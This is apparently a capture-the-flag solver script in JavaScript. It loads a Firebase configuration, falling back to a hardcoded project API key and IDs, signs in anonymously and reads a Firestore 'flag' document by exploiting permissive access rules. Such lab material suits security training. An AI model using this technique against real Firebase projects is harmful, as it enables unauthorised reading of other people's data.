
const { initializeApp } = require('firebase/app');
const { getAuth, signInAnonymously } = require('firebase/auth');
const { getFirestore, doc, getDoc, collection, getDocs } = require('firebase/firestore');

async function solve() {
  console.log('[+] Step 1: Fetching Firebase configuration from /__/firebase/init.json');
  
  let firebaseConfig;
  try {
    const response = await fetch('http://localhost:8080/__/firebase/init.json');
    firebaseConfig = await response.json();
    console.log('[✓] Firebase config retrieved successfully');
    console.log('    Project ID:', firebaseConfig.projectId);
  } catch (error) {
    firebaseConfig = {
      "apiKey": "AIzaSyB1kqIS-VeVk_KB4IlVE9vYBm7_7LGFrNQ",
      "authDomain": "greenhat-e5ed6.firebaseapp.com",
      "projectId": "greenhat-e5ed6",
      "storageBucket": "greenhat-e5ed6.firebasestorage.app",
      "messagingSenderId": "702590754082",
      "appId": "1:702590754082:web:b40770b4a154f30083997b"
    };
  }

  // Step 2: Initialize Firebase
  console.log('\n[+] Step 2: Initializing Firebase app');
  const app = initializeApp(firebaseConfig);
  const auth = getAuth(app);
  const db = getFirestore(app);

  // Step 3: Sign in anonymously
  console.log('\n[+] Step 3: Signing in anonymously');
  try {
    const userCredential = await signInAnonymously(auth);
    console.log('[✓] Signed in successfully');
    console.log('    User ID:', userCredential.user.uid);
  } catch (error) {
    console.error('[!] Authentication failed:', error);
    return;
  }

  // Step 4: Explore the collections
  console.log('\n[+] Step 4: Exploring Ibn Taymiyyah\'s Wasitiyyah collection');
  
  try {
    // First, let's see what's in the wasitiyyah collection
    const wasitiyyahRef = collection(db, 'scholars', 'ibn-taymiyyah', 'wasitiyyah');
    const snapshot = await getDocs(wasitiyyahRef);
    
    console.log('[*] Documents in wasitiyyah collection:');
    snapshot.forEach((doc) => {
      console.log(`    - ${doc.id}`);
    });
  } catch (error) {
    console.error('[!] Failed to list collection:', error);
  }

  // Step 5: Get the flag
  console.log('\n[+] Step 5: Accessing the flag document');
  
  try {
    const flagRef = doc(db, 'scholars', 'ibn-taymiyyah', 'wasitiyyah', 'flag');
    const flagDoc = await getDoc(flagRef);
    
    if (flagDoc.exists()) {
      const data = flagDoc.data();
      console.log('\n[✓] SUCCESS! Flag found!');
      console.log('╔══════════════════════════════════════════════════════════╗');
      console.log(`║ Flag: ${data.flag} ║`);
      console.log('╚══════════════════════════════════════════════════════════╝');
      console.log(`\nMessage: "${data.message}"`);
      if (data.verse) {
        console.log(`Verse: ${data.verse}`);
        console.log(`Translation: ${data.translation}`);
      }
    } else {
      console.error('[!] Flag document not found');
    }
  } catch (error) {
    console.error('[!] Failed to access flag:', error);
  }
}

// Run the solver
solve().catch(console.error);